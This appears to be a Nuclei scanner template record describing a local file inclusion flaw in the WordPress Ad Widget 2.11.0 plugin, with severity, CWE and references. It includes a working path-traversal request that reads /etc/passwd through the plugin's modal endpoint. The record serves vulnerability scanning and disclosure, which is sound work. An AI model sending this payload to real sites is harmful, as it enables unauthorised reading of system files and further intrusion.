# Nuclei Template: WordPress Ad Widget 2.11.0 - Local File Inclusion
**Template ID:** ad-widget-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`ad-widget-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00
```

## References
- https://cxsecurity.com/issue/WLB-2017100084
- https://plugins.trac.wordpress.org/changeset/1628751/ad-widget
- https://wpscan.com/vulnerability/caca21fe-56bf-4d4c-afc8-4a218e52f0a2
